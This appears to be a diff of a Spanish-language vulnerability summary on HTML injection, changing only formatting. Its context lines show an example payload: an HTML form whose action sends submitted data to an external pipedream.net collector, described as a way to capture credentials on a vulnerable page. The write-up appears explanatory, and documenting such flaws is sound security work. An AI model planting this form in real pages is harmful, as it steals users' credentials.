@@ -1,7 +1,7 @@
 - --
 ###  Resumen de la Vulnerabilidad: HTML Injection
 
-#### 💡 Ejemplo de Explotación
+#### Ejemplo de Explotación
 El código HTML mostrado en la imagen se puede insertar en una página vulnerable para capturar credenciales:
 ```html
 <form action="https://eo2iwcccmp2l4wb.m.pipedream.net" method="GET">
@@ -11,4 +11,4 @@ El código HTML mostrado en la imagen se puede insertar en una página vulnerabl
 </form>
 ```
 
----
+-- -
